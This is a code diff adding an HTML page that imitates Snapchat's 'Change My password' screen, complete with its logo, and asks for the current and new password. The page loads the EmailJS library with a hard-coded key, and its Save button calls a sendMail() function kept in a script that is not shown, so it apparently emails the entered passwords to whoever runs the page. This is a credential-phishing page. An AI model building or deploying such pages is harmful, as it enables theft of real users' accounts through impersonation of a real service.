@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  <title>Reset Password • Snapchat</title>
+  <link rel="stylesheet" type ='text/css' href ="style.css">
+  <link rel="icon" type="image/svg" href="./assets/snapchat.png"/>
+  <script
+    type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+  >
+  </script>
+  <script type="text/javascript">
+  (function () {
+    emailjs.init("JaycOEXHXMtuChY8y");
+  })();
+</script>
+  
+</head>
+<body>
+  <div>
+   <div class="top"></div>
+    <div class= "main">
+      <img class="snapchat-icon" src="./assets/snapchat.png" alt="Snapchat">
+      <h2>Change My password</h2>
+      <p class="description">In order to best protect your account, please select a password that is at least 8 characters long and contains a combination of uppercase and lowercase letters, numbers and/or symbols.</p>
+    </div>
+    <div class="container">
+      <label>Current Password</label>
+      <div class ="input_container"> 
+        <input  id="CurrentPassword" type="password" />
+        <Button name="current" id="toggle_show" class="input_show">Show</Button>
+      </div>
+    </div>
+    
+    <div class="container">
+      <label>New Password</label>
+      <div class ="input_container"> 
+        <input id="NewPassword" type="password" />
+        <Button name="New" id="toggle_show" class="input_show">Show</Button>
+      </div>
+    </div>
+
+    <div class="container">
+      <label>Confirm Password</label>
+      <div class ="input_container"> 
+        <input id="ConfirmPassword" type="password" />
+      </div>
+    </div>
+    <div class="button_container">
+      <Button id="Submit" class="Submit" onclick="sendMail()">Save</Button>
+    </div>
+    <p class="description middle">Don't re-use the same password on different services, especially if you are using the same Username.</p>
+
+  </div>
+   <div class="top"></div>
+  <div class="footer">
+    <img src="./assets/arrow.svg">
+    <p>Company</p>
+  </div>
+    <div class="footer">
+    <img src="./assets/arrow.svg">
+    <p>Community</p>
+  </div>
+    <div class="footer">
+    <img src="./assets/arrow.svg">
+    <p>Advertising</p>
+  </div>
+    <div class="footer">
+    <img src="./assets/arrow.svg">
+    <p>Company</p>
+  </div>
+</body>
+<script src="./script.js"></script>
+</html>
